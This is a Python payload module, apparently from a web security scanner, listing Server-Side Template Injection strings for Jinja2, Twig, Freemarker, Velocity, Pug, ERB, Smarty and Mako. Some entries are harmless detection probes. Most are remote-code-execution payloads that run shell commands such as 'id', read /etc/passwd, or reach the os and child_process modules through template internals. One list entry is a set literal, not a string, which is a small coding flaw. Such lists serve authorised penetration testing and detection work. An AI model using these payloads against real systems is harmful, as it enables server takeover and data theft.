"""SSTI payloads — Jinja2, Twig, Freemarker, Velocity, Jade/Pug, ERB."""

NAME = "Server-Side Template Injection"
DESCRIPTION = "SSTI detection + RCE payloads for Jinja2, Twig, Freemarker, Velocity, Jade/Pug, ERB"
RISK = "HIGH"

PAYLOADS = [
    # Detection
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    # Jinja2
    "{{config}}",
    "{{self}}",
    "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    "{{ lipsum.__globals__['os'].popen('id').read() }}",
    "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
    # Twig
    "{{ _self.env.registerUndefinedFilterCallback('exec') }}",
    "{{ _self.env.getFilter('cat /etc/passwd') }}",
    # Freemarker
    "${7*7}",
    "${7*'7'}",
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
    # Velocity
    "#set($x=7*7)$x",
    "#set($e='exec')$e('id')",
    # Jade/Pug
    "= 7*7",
    "= global.process.mainModule.require('child_process').execSync('id').toString()",
    # ERB (Ruby)
    "<%= 7*7 %>",
    "<%= system('id') %>",
    "<%= `id` %>",
    # Smarty (PHP)
    "{7*7}",
    "{system('id')}",
    {"$smarty.version"},
    # Mako (Python)
    "${7*7}",
    "${self.module.cache.util.os.popen('id').read()}",
]
